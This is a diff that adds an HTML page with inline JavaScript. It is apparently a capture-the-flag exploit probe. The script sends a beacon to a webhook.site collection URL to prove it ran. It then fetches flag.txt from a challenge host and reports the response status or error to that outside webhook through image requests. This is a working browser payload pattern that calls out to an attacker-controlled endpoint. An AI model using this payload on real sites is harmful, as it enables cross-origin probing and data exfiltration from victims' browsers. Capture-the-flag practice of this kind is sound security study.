@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+/* baseline: prove the script actually ran */
+(new Image()).src =
+  "https://webhook.site/a87b8e30-80cc-4c2d-924a-f823fcde0a64?m=jsfired";
+
+/* now try to touch the flag and report status only */
+fetch("https://jq2qgjxq-sourceless.instancer.2025.ctfcompetition.com/flag.txt")
+  .then(r => {
+      (new Image()).src =
+        "https://webhook.site/a87b8e30-80cc-4c2d-924a-f823fcde0a64?m=status-"+r.status;
+  })
+  .catch(e => {
+      (new Image()).src =
+        "https://webhook.site/a87b8e30-80cc-4c2d-924a-f823fcde0a64?m=error-"+encodeURIComponent(e);
+  });
+</script>
+</body>
+</html>
